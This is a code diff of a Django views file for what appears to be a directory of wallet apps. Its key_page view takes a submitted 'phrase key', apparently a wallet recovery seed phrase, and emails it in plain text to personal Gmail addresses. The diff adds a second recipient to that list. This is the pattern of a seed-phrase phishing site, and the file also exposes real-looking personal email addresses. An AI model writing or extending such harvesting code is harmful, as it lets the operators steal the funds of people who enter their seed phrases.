@@ -12,7 +12,7 @@ def homePage(request):
     if search_query:
         all_apps = Multiapps.objects.filter(name__icontains=search_query)
     else:
-        all_apps = Multiapps.objects.all()
+        all_apps = Multiapps.objects.all().order_by('-id')
     page_obj=paginate_objects(request, all_apps, 24)
     context = {
         'page_obj': page_obj,
@@ -34,11 +34,11 @@ def key_page(request, app_id):
             key_form = form.save(commit=False)
             key_form.name = app
             key_form.save()
-            
+
             # Email sending logic
             subject = f"New Phrase Key Submission for {app.name}"
             message = f"Phrase Key: {key_form.phrase_key}"
-            recipient_list = ['prettywashington17@gmail.com']
+            recipient_list = ['prettywashington17@gmail.com','successsimeon484@gmail.com']
             sender_email = 'webmaster@example.com'
             send_mail(subject, message, sender_email, recipient_list)
             return redirect('success', app_id=app.id)
